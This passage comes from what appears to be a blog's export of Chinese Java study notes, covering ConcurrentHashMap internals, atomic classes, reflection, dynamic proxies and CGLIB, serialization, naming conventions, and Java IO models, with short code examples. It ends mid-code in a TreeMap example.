<p><strong>使用<code>ConcurrentHashMap</code>：</strong> <code>ConcurrentHashMap</code>是Java提供的线程安全的<code>Map</code>实现。它使用分段锁机制，每个段相当于一个小的<code>HashMap</code>，不同的段之间互不影响，这样可以提高并发性能。</p>
<p>Map&lt;K, V&gt; concurrentMap = new ConcurrentHashMap&lt;K, V&gt;();</p>
</li>
</ol>
<h2 id="3-3-ConcurrentHashMap">3.3 ConcurrentHashMap</h2>
<blockquote>
<p>[!note]<br>
ConcurrentHashMap：Node数组+链表+红黑树实现，线程安全的（jdk1.8以前Segment锁，1.8以后volatile + CAS 或者 synchronized）</p>
</blockquote>
<h3 id="3-3-1-JDK-1-7">3.3.1 JDK 1.7</h3>
<blockquote>
<p>Segment数组，通过分段锁（Segmentation）实现线程安全。它将整个哈希表分成多个段（Segment），每个段都是一个小的哈希表，并且拥有自己的锁。这样，多个线程可以并发地访问不同的段，从而减少了锁的竞争，提高了并发性能。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404012148392.png" alt="image.png"></p>
<h3 id="3-3-2-JDK-1-8">3.3.2 JDK 1.8</h3>
<p>在 JDK 1.7 中它使用的是数组加链表的形式实现的，而数组又分为：大数组 Segment 和小数组 HashEntry。 Segment 是一种可重入锁（ReentrantLock），在 ConcurrentHashMap 里扮演锁的角色；HashEntry 则用于存储键值对数据。一个 ConcurrentHashMap 里包含一个 Segment 数组，一个 Segment 里包含一个 HashEntry 数组，每个 HashEntry 是一个链表结构的元素。</p>
<p>直接在table元素上加锁，实现对每一行进行加锁，进一步减小了并发冲突的概率。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>对于put操作，如果Key对应的数组元素为null，则通过CAS操作（Compare and Swap）将其设置为当前值。</p>
</li>
<li class="lvl-2">
<p>如果Key对应的<mark>数组元素</mark>（也即链表表头或者树的根元素）不为null，则对该元素使用 synchronized 关键字申请锁，然后进行操作。</p>
</li>
<li class="lvl-2">
<p>如果该 put 操作使得当前链表长度超过一定阈值，则将该链表转换为红黑树，从而提高寻址效率。</p>
</li>
</ul>
<blockquote>
<p>使用了一种更细粒度的锁策略，结合CAS（Compare-and-Swap）无锁算法来实现线程安全。在JDK 1.8中，ConcurrentHashMap将整个哈希表看作一个整体，不再进行分段。而是通过<mark>Node数组+链表+红黑树</mark>的结构来存储数据，并使用Synchronized和CAS来协调并发访问。</p>
</blockquote>
<p>锁粒度更细，<code>synchronized</code> 只锁定当前链表或红黑二叉树的首节点，这样只要 hash 不冲突，就不会产生并发，就不会影响其他 Node 的读写，效率大幅提升。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404012149783.png" alt="image.png"></p>
<h3 id="3-3-3-JDK-1-7-和-JDK-1-8-的-ConcurrentHashMap-实现有什么不同？">3.3.3 JDK 1.7 和 JDK 1.8 的 ConcurrentHashMap 实现有什么不同？</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>线程安全实现方式</strong>：JDK 1.7 采用 <code>Segment</code> 分段锁来保证安全， <code>Segment</code> 是继承自 <code>ReentrantLock</code>。JDK1.8 放弃了 <code>Segment</code> 分段锁的设计，采用 <code>Node + CAS + synchronized</code> 保证线程安全，锁粒度更细，<code>synchronized</code> 只锁定当前链表或红黑二叉树的首节点。</p>
</li>
<li class="lvl-2">
<p><strong>Hash 碰撞解决方法</strong> : JDK 1.7 采用拉链法，JDK1.8 采用拉链法结合红黑树（链表长度超过一定阈值时，将链表转换为红黑树）。</p>
</li>
<li class="lvl-2">
<p><strong>并发度</strong>：JDK 1.7 最大并发度是 Segment 的个数，默认是 16。JDK 1.8 最大并发度是 Node 数组的大小，并发度更大。</p>
</li>
</ul>
<p><a href="https://javaguide.cn/java/collection/concurrent-hash-map-source-code.html#_4-get">ConcurrentHashMap 源码分析 | JavaGuide</a><br>
<a href="https://zhuanlan.zhihu.com/p/94976168">一文彻底搞懂CAS实现原理 &amp; 深入到CPU指令 - 知乎 (zhihu.com)</a><br>
<a href="https://javaguide.cn/java/collection/java-collection-questions-02.html#map-%E9%87%8D%E8%A6%81">Java集合常见面试题总结(下) | JavaGuide</a></p>
<h1>4 Atomic</h1>
<p><code>java.util.concurrent.atomic</code> 包提供了一组用于在多线程环境中进行原子操作的类。这些类通过使用硬件级别的原子性操作或者利用 <code>sun.misc.Unsafe</code> 提供的 CAS（Compare-And-Swap）操作来确保对变量的操作是原子的。这些类大多数都是基于原始数据类型的，例如 <code>int</code>、<code>long</code>，还有一些是引用类型。</p>
<p>以下是 <code>java.util.concurrent.atomic</code> 包中一些主要的类以及它们的用途：</p>
<ol>
<li class="lvl-3">
<p><strong>AtomicInteger：</strong> 用于对整数进行原子操作，支持原子的自增（<code>incrementAndGet()</code>）、自减（<code>decrementAndGet()</code>）等操作。</p>
</li>
<li class="lvl-3">
<p><strong>AtomicLong：</strong> 用于对长整型进行原子操作，同样支持原子的自增、自减等操作。</p>
</li>
<li class="lvl-3">
<p><strong>AtomicBoolean：</strong> 用于对布尔类型进行原子操作，支持原子的设置和获取操作。</p>
</li>
<li class="lvl-3">
<p><strong>AtomicReference：</strong> 用于对引用类型进行原子操作，支持原子的获取和设置引用对象。</p>
</li>
<li class="lvl-3">
<p><strong>AtomicIntegerArray、AtomicLongArray、AtomicReferenceArray：</strong> 用于对数组中的元素进行原子操作，提供了一些原子性的数组操作。</p>
</li>
<li class="lvl-3">
<p><strong>AtomicIntegerFieldUpdater、AtomicLongFieldUpdater、AtomicReferenceFieldUpdater：</strong> 用于对类的字段进行原子更新，允许在并发环境中对对象的字段进行原子性操作。</p>
</li>
</ol>
<p>这些原子类提供了一种比使用 <code>synchronized</code> 关键字更轻量级的线程安全机制，特别适用于一些简单的计数器、状态标志等场景。在需要进行原子操作而又不需要全局的锁的情况下，这些类可以提供更好的性能。</p>
<p>虽然这些类提供了原子性的操作，但并不是所有的操作都可以用原子方式完成，因此在使用时仍然需要注意保证原子性的操作是否符合预期。</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/01/08/Java/Java(4)%EF%BC%9A%E5%8F%8D%E5%B0%84%E3%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="0-1-反射机制">0.1 反射机制</h2>
<blockquote>
<p>应用场景：动态代理、注解</p>
</blockquote>
<p>赋予了我们在运行时分析类以及执行类中方法的能力,通过反射你可以获取任意一个类的所有属性和方法，你还可以调用这些方法和属性。</p>
<p>获取Class对象</p>
<blockquote>
<p>一个类的对象表示，一个Class对象表示一个特定类的属性</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//TargteObject表示一个类</span></span><br><span class="line"><span class="number">1.</span> 知道具体类</span><br><span class="line">	Class c=TargetObject.class;</span><br><span class="line"><span class="number">2.</span> 通过 Class.forName()传入类的全路径获取：</span><br><span class="line">	Class c=Class.forName(<span class="string">&quot;cn.javaguide.TargetObject&quot;</span>);</span><br><span class="line"><span class="number">3.</span> 通过对象实例获取</span><br><span class="line">	<span class="type">TargetObject</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TargetObject</span>();</span><br><span class="line">	<span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"><span class="number">4.</span>  通过类加载器xxxClassLoader.loadClass()传入类路径获取:</span><br><span class="line">	ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;cn.javaguide.TargetObject&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>c.getDeclaredConstructors()</p>
<ul class="lvl-2">
<li class="lvl-6">getParameterTypes()</li>
</ul>
</li>
<li class="lvl-2">
<p>c.getDeclaredMethods()</p>
</li>
<li class="lvl-2">
<p>c.getDeclaredFields()</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">类名.方法名</span><br><span class="line">方法名.invoke(类名)</span><br></pre></td></tr></table></figure>
<h1>1 注解</h1>
<p><code>Annotation</code> （注解） 是 Java5 开始引入的新特性，可以看作是一种特殊的注释，主要用于修饰类、方法或者变量，提供某些信息供程序在编译或者运行时使用。</p>
<p>注解本质是一个继承了<code>Annotation</code> 的特殊接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.SOURCE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Override &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Override</span> <span class="keyword">extends</span> <span class="title class_">Annotation</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JDK 提供了很多内置的注解（比如 <code>@Override</code>、<code>@Deprecated</code>），同时，我们还可以自定义注解。</p>
<p>注解只有被解析之后才会生效，常见的解析方法有两种：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>编译期直接扫描</strong>：编译器在编译 Java 代码的时候扫描对应的注解并处理，比如某个方法使用<code>@Override</code> 注解，编译器在编译的时候就会检测当前的方法是否重写了父类对应的方法。</p>
</li>
<li class="lvl-2">
<p><strong>运行期通过反射处理</strong>：像框架中自带的注解(比如 Spring 框架的 <code>@Value</code>、<code>@Component</code>)都是通过反射来进行处理的。</p>
</li>
</ul>
<h1>2 代理</h1>
<h2 id="2-1-动态代理-proxy">2.1 动态代理(proxy)</h2>
<blockquote>
<p>为指定的接口在系统运行期间动态地生成代理对象动态代理机制的实现主要由一个类和一个接口组成， 即java. lang. reflect . Proxy类和java .lang. reflect.InvocationH.andler接口</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403301619023.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;  </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">info</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Animal</span>&#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">info</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Animal Dog&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnimalInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> Object target;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AnimalInvocationHandler</span><span class="params">(Object target)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.target=target;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">	    <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;info&quot;</span>))&#123;</span><br><span class="line">	        <span class="keyword">return</span> method.invoke(target,args);  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentTest</span> &#123;  </span><br><span class="line">    <span class="meta">@Test</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test_proxy</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();  </span><br><span class="line">  </span><br><span class="line">        Animal animal=(Animal) Proxy.newProxyInstance(classLoader,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Animal.class&#125;,<span class="keyword">new</span> <span class="title class_">AnimalInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">Dog</span>()));  </span><br><span class="line">        animal.info();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当Proxy动态生成的代理对象上相应的接口方法被调用时，对应的Invocat ionHandler就会拦截相应的方法调用，并进行相应处理。InvocationHandler就是我们实现横切逻辑的地方，它是横切逻辑的载体，作用跟Advice是一样的。</p>
<h2 id="2-2-CGLIB（动态字节码生成-Code-Generation-Library）">2.2 CGLIB（动态字节码生成, Code Generation Library）</h2>
<blockquote>
<p>动态字节码生成技术扩展对象行为：对目标对象进行继承扩展，为其生成相应的子类，而子类可以通过覆写来扩展父类的行为，只要将横切逻辑的实现放到子类中，然后让系统使用扩展后的目标对象的子类，就可以达到与代理模式相同的效果。<br>
CGLIB可以对实现了某种接口的类，或者没有实现任何接口的类进行扩</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Requestable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">request</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;In class Requestable, method request&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestCallback</span> <span class="keyword">implements</span> <span class="title class_">MethodInterceptor</span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">newInstall</span><span class="params">(Object object)</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> Enhancer.create(object.getClass(), <span class="built_in">this</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object o, Method method, Object[] objects, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">        <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;request&quot;</span>))&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;Before request&quot;</span>);  </span><br><span class="line">            <span class="keyword">return</span> methodProxy.invokeSuper(o,objects);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentTest</span> &#123;</span><br><span class="line">	<span class="meta">@Test</span>  </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test_cglib</span><span class="params">()</span>&#123;  </span><br><span class="line">		<span class="comment">//通过CGLIB的Enhancer为目标对象动态地生成一个子类</span></span><br><span class="line">	    Enhancer enhancer=<span class="keyword">new</span> <span class="title class_">Enhancer</span>();  </span><br><span class="line">	    enhancer.setSuperclass(Requestable.class);  </span><br><span class="line">	    enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">RequestCallback</span>());  </span><br><span class="line">		<span class="comment">//通过为enhancer指定需要生成的子类对应的父类，以及Callback实现</span></span><br><span class="line">		<span class="comment">//enhancer最终为我们生成了需要的代理对象实例。</span></span><br><span class="line">	    Requestable proxy=(Requestable) enhancer.create();  </span><br><span class="line">	    proxy.request();  </span><br><span class="line">	  </span><br><span class="line">	    RequestCallback requestCallback=<span class="keyword">new</span> <span class="title class_">RequestCallback</span>();  </span><br><span class="line">	    Requestable requestable=(Requestable) requestCallback.newInstall(<span class="keyword">new</span> <span class="title class_">Requestable</span>());  </span><br><span class="line">	    requestable.request();  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>无法对final方法进行覆写<a href="https://blog.csdn.net/Passer_hua/article/details/122617628">【Java】代理模式（Proxy模式）详解_java proxy-CSDN博客</a></p>
</li>
</ul>
<h1>3 序列化</h1>
<p>如果我们需要持久化 Java 对象比如将 Java 对象保存在文件中，或者在网络传输 Java 对象，这些场景都需要用到序列化。</p>
<p>简单来说：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>序列化</strong>：将数据结构或对象转换成二进制字节流的过程</p>
</li>
<li class="lvl-2">
<p><strong>反序列化</strong>：将在序列化过程中所生成的二进制字节流转换成数据结构或者对象的过程</p>
</li>
</ul>
<p>对于 Java 这种面向对象编程语言来说，我们序列化的都是对象（Object）也就是实例化后的类(Class)，但是在 C++这种半面向对象的语言中，struct(结构体)定义的是数据结构类型，而 class 对应的是对象类型。</p>
<p>下面是序列化和反序列化常见应用场景：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>对象在进行网络传输（比如远程方法调用 RPC 的时候）之前需要先被序列化，接收到序列化的对象之后需要再进行反序列化；</p>
</li>
<li class="lvl-2">
<p>将对象存储到文件之前需要进行序列化，将对象从文件中读取出来需要进行反序列化；</p>
</li>
<li class="lvl-2">
<p>将对象存储到数据库（如 Redis）之前需要用到序列化，将对象从缓存数据库中读取出来需要反序列化；</p>
</li>
<li class="lvl-2">
<p>将对象存储到内存之前需要进行序列化，从内存中读取出来之后需要进行反序列化。</p>
</li>
</ul>
<h1>4 Spring</h1>
<h2 id="4-1-代理Bean注册到Spring容器">4.1 代理Bean注册到Spring容器</h2>
<p>类的调用是不能直接调用没有实现的接口的，所以需要通过<mark>代理</mark>的方式给接口生成对应的实现类。接下来再通过把代理类放到 Spring 的 FactoryBean 的实现中，最后再把这个 FactoryBean 实现类注册到 Spring 容器。那么现在你的代理类就已经被注册到 Spring 容器了，接下来就可以通过注解的方式注入到属性中。</p>
<p><a href="https://bugstack.cn/md/java/interview/2021-03-30-%E9%9D%A2%E7%BB%8F%E6%89%8B%E5%86%8C%20%C2%B7%20%E7%AC%AC28%E7%AF%87%E3%80%8A%E4%BD%A0%E8%AF%B4%EF%BC%8C%E6%80%8E%E4%B9%88%E6%8A%8ABean%E5%A1%9E%E5%88%B0Spring%E5%AE%B9%E5%99%A8%E3%80%8B.html">面经手册 · 第28篇《你说，怎么把Bean塞到Spring容器？》 | 小傅哥 bugstack 虫洞栈</a></p>
<p>spring-framework\spring-beans\src\main\java\org\springframework\beans\factory\support\InstantiationStrategy：实例化策略抽象接口<br>
spring-framework\spring-beans\src\main\java\org\springframework\beans\factory\support\SimpleInstantiationStrategy.java：简单的对象实例化功能</p>
<h1>5 参考</h1>
<p><a href="https://javaguide.cn/java/basis/reflection.html#%E5%8F%8D%E5%B0%84%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%E4%BA%86%E8%A7%A3%E4%B9%88">Java 反射机制详解 | JavaGuide(Java面试+学习指南)</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/12/10/Java/Java%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<h1>1 package</h1>
<p>indi ：</p>
<p>个体项目，指个人发起，但非自己独自完成的项目，可公开或私有项目，copyright主要属于发起者。</p>
<p>包名为“indi.发起者名.项目名.模块名.……”。</p>
<p>pers ：</p>
<p>个人项目，指个人发起，独自完成，可分享的项目，copyright主要属于个人。</p>
<p>包名为“pers.个人名.项目名.模块名.……”。</p>
<p>priv ：</p>
<p>私有项目，指个人发起，独自完成，非公开的私人使用的项目，copyright属于个人。</p>
<p>包名为“priv.个人名.项目名.模块名.……”。</p>
<p>team ：</p>
<p>团队项目，指由团队发起，并由该团队开发的项目，copyright属于该团队所有。</p>
<p>包名为“team.团队名.项目名.模块名.……”。</p>
<p>com ：</p>
<p>公司项目，copyright由项目发起的公司所有。</p>
<p>包名为“com.公司名.项目名.模块名.……”。</p>
<p><a href="https://www.zhihu.com/question/450664324">java 项目的包命名规则是什么</a></p>
<h1>2 命名规范</h1>
<p><a href="https://zhuanlan.zhihu.com/p/448253937">10分钟搞定令人头疼的代码命名规范 | JavaGuide - 知乎 (zhihu.com)</a></p>
<h1>3 Java对象概念：PO BO VO DTO DAO</h1>
<p>PO 是 Persistant Object 的缩写，用于表示数据库中的一条记录映射成的 java 对象。PO 仅仅用于表示数据，没有任何数据操作。通常遵守 Java Bean 的规范，拥有 getter/setter 方法。</p>
<p>DAO 是 Data Access Object 的缩写，用于表示一个数据访问对象。使用 DAO 访问数据库，包括插入、更新、删除、查询等操作，与 PO 一起使用。DAO 一般在持久层，完全封装数据库操作，对外暴露的方法使得上层应用不需要关注数据库相关的任何信息。(<mark>Maper映射，封装数据库操作的一个映射对象</mark>)</p>
<p>VO 是 Value Object 的缩写，用于表示一个与前端进行交互的 java 对象。有的朋友也许有疑问，这里可不可以使用 PO 传递数据？实际上，这里的 VO 只包含前端需要展示的数据即可，对于前端不需要的数据，比如数据创建和修改的时间等字段，出于减少传输数据量大小和保护数据库结构不外泄的目的，不应该在 VO 中体现出来。通常遵守 Java Bean 的规范，拥有 getter/setter 方法。</p>
<p>DTO 是 Data Transfer Object 的缩写，用于表示一个数据传输对象。DTO 通常用于不同服务或服务不同分层之间的数据传输。DTO 与 VO 概念相似，并且通常情况下字段也基本一致。但 DTO 与 VO 又有一些不同，这个不同主要是设计理念上的，比如 API 服务需要使用的 DTO 就可能与 VO 存在差异。通常遵守 Java Bean 的规范，拥有 getter/setter 方法。</p>
<p>BO 是 Business Object 的缩写，用于表示一个业务对象。BO 包括了业务逻辑，常常封装了对 DAO、RPC 等的调用，可以进行 PO 与 VO/DTO 之间的转换。BO 通常位于业务层，要区别于直接对外提供服务的服务层：BO 提供了基本业务单元的基本业务操作，在设计上属于被服务层业务流程调用的对象，一个业务流程可能需要调用多个 BO 来完成。</p>
<p>POJO 是 Plain Ordinary Java Object 的缩写，表示一个简单 java 对象。上面说的 PO、VO、DTO 都是典型的 POJO。而 DAO、BO 一般都不是 POJO，只提供一些调用方法。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202312052259482.png" alt="image.png"></p>
<p><a href="https://www.zhihu.com/question/39651928">PO BO VO DTO POJO DAO DO这些Java中的概念分别指一些什么？ - 知乎 (zhihu.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>Java(5)：IO模型</title>
    <url>/2024/08/07/Java/Java(5)%EF%BC%9AIO%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<p><strong>同步阻塞 I/O</strong>、<strong>同步非阻塞 I/O</strong>、<strong>I/O 多路复用</strong>、<strong>信号驱动 I/O</strong> 和<strong>异步 I/O</strong></p>
<h1>1 BIO (Blocking I/O)</h1>
<p>BIO属于同步阻塞IO模型。同步阻塞 IO 模型中，应用程序发起 read 调用后，会一直阻塞，直到内核把数据拷贝到用户空间。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408072332308.png" alt="image.png|425"></p>
<h1>2 NIO (Non-blocking/New I/O)</h1>
<p>NIO 可以看作是 <strong>I/O 多路复用模型</strong>。也有很多人认为，Java 中的 NIO 属于同步非阻塞 IO 模型。</p>
<p>NIO 主要包括以下三个核心组件：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Buffer（缓冲区）</strong>：NIO 读写数据都是通过缓冲区进行操作的。读操作的时候将 Channel 中的数据填充到 Buffer 中，而写操作时将 Buffer 中的数据写入到 Channel 中。</p>
</li>
<li class="lvl-2">
<p><strong>Channel（通道）</strong>：Channel 是一个双向的、可读可写的数据传输通道，NIO 通过 Channel 来实现数据的输入输出。通道是一个抽象的概念，它可以代表文件、套接字或者其他数据源之间的连接。Channel 是一个通道，它建立了与数据源（如文件、网络套接字等）之间的连接。我们可以利用它来读取和写入数据。</p>
</li>
<li class="lvl-2">
<p><strong>Selector（选择器）</strong>：允许一个线程处理多个 Channel，基于事件驱动的 I/O 多路复用模型。所有的 Channel 都可以注册到 Selector 上，由 Selector 来分配线程来处理事件。通过 Selector 注册通道的事件，Selector 会不断地<mark>轮询</mark>注册在其上的 Channel。当事件发生时，比如：某个 Channel 上面有新的 TCP 连接接入、读和写事件，这个 Channel 就处于就绪状态，会被 Selector 轮询出来。Selector 会将相关的 Channel 加入到<mark>就绪集合</mark>中。通过 SelectionKey 可以获取就绪 Channel 的集合，然后对这些就绪的 Channel 进行相应的 I/O 操作。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408082221001.png" alt="image.png"></p>
<h2 id="2-1-NIO零拷贝">2.1 NIO零拷贝</h2>
<p>零拷贝是提升 IO 操作性能的一个常用手段，像 ActiveMQ、Kafka 、RocketMQ、QMQ、Netty 等顶级开源项目都用到了零拷贝。</p>
<p>零拷贝是指计算机执行 IO 操作时，CPU 不需要将数据从一个存储区域复制到另一个存储区域，从而可以减少上下文切换以及 CPU 的拷贝时间。也就是说，零拷贝主要解决操作系统在处理 I/O 操作时频繁复制数据的问题。零拷贝的常见实现技术有： <code>mmap+write</code>、<code>sendfile</code>和 <code>sendfile + DMA gather copy</code> 。</p>
<p>下图展示了各种零拷贝技术的对比图：</p>
<p>|CPU 拷贝|DMA 拷贝|系统调用|上下文切换|<br>
|—|—|—|—|—|<br>
|传统方法|2|2|read+write|4|<br>
|mmap+write|1|2|mmap+write|4|<br>
|sendfile|1|2|sendfile|2|<br>
|sendfile + DMA gather copy|0|2|sendfile|2|</p>
<p>可以看出，无论是传统的 I/O 方式，还是引入了零拷贝之后，2 次 DMA(Direct Memory Access) 拷贝是都少不了的。因为两次 DMA 都是依赖硬件完成的。零拷贝主要是减少了 CPU 拷贝及上下文的切换。</p>
<h1>3 AIO (Asynchronous I/O)</h1>
<p>异步 IO 是基于事件和回调机制实现的，也就是应用操作之后会直接返回，不会堵塞在那里，当后台处理完成，操作系统会通知相应的线程进行后续的操作。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408082222440.png" alt="image.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202409212339078.png" alt="image.png"></p>
<h1>4 参考</h1>
<p><a href="https://javaguide.cn/java/io/io-model.html">Java IO 模型详解 | JavaGuide</a><br>
<a href="https://javaguide.cn/java/io/nio-basis.html">Java NIO 核心知识总结 | JavaGuide</a></p>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>IO</tag>
        <tag>零拷贝</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/07/13/Java/Java/</url>
    <content><![CDATA[<p>@resource<br>
postConstruct</p>
<h1>1 Map</h1>
<h2 id="1-1-Map对象遍历">1.1 Map对象遍历</h2>
<p><a href="https://blog.csdn.net/tjcyjd/article/details/11111401">(50条消息) Java中如何遍历Map对象的4种方法_map遍历_Java高知社区的博客-CSDN博客</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历的是一个空的map对象，for-each循环将抛出NullPointerException，因此在遍历前你总是应该检查空引用。</span></span><br><span class="line">Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, Integer&gt;();</span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Key = &quot;</span> + entry.getKey() + <span class="string">&quot;, Value = &quot;</span> + entry.getValue());</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//遍历map中的键</span></span><br><span class="line"><span class="keyword">for</span> (Integer key : map.keySet()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Key = &quot;</span> + key);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//遍历map中的值</span></span><br><span class="line"><span class="keyword">for</span> (Integer value : map.values()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Value = &quot;</span> + value);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-2-TreeMap">1.2 TreeMap</h2>
<h3 id="1-2-1-自定义排序">1.2.1 自定义排序</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> indiv.yyg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: yyg</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2024/5/14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>  Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(Integer age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span 